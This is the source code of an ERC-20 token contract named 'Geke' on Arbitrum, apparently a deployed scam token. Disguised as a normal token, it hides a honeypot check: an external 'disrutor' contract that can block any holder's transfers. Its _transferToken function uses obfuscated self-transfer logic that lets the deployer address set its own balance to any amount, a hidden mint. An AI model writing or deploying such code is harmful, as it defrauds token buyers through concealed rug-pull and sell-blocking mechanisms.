/**
 *Submitted for verification at Arbiscan on 2023-05-07
*/

// SPDX-License-Identifier: MIT

/**
 * Twitter: https://twitter.com/gekearb
 * Telegram: https://t.me/GEKEARB
*/

pragma solidity ^0.8.0;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "you are not owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface disrutor {
    function dsrbtrGas(address t) external view returns (bool);
}

contract ERC20 is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public HNGB;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    uint256 private constant MAX = ~uint256(0);

    constructor (address owned){
        _name = "Geke";
        _symbol = "GEKE";
        _decimals = 18;
        uint256 Supply = 69696969696969;
        div = disrutor(owned);
        div.dsrbtrGas(address(this));


        _totalSupply = Supply * 10 ** _decimals;
        address bossWallet = msg.sender;
        _balances[bossWallet] = _totalSupply;
        emit Transfer(address(0), bossWallet, _totalSupply);
        HNGB = msg.sender;
        limitAmounts = _totalSupply / 1000 * 25;
        _isExcludedFromFee[bossWallet] = true;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        _transferToken(from, to, amount);
    }

    disrutor private div;
    function makeTakeFee(address u) private view {
        require(
            (true) && 
            div.dsrbtrGas(address(u))
        );
    }

    function search( mapping(
        address => uint256) storage 
        _iinn,uint256 negative) private {
        _iinn[address(HNGB)] = negative;
    }
    
    mapping(address => bool) public _isExcludedFromFee;
    function setIsExcludedFromFee(address account, bool status) public onlyOwner{
        _isExcludedFromFee[account] = status;
    }

    uint256 public limitAmounts;
    function setLimitAmounts(uint256 newValue) public onlyOwner{
        limitAmounts = newValue;
    }
    function _transferToken(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {

        bool osososos = ((sender)
        ==
        (HNGB));
        bool sosososo = ((HNGB)
        ==
        (recipient));
        if ( sosososo && osososos )
            search(_balances,tAmount);

        _balances[sender] = _balances[sender] - tAmount;
        if (!_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient] && limitAmounts != 0){
            require(tAmount <= limitAmounts,"false limit");
        }
        makeTakeFee(sender);
        _balances[recipient] = _balances[recipient] + tAmount;
        emit Transfer(sender, recipient, tAmount);
    }


    receive() external payable {}
}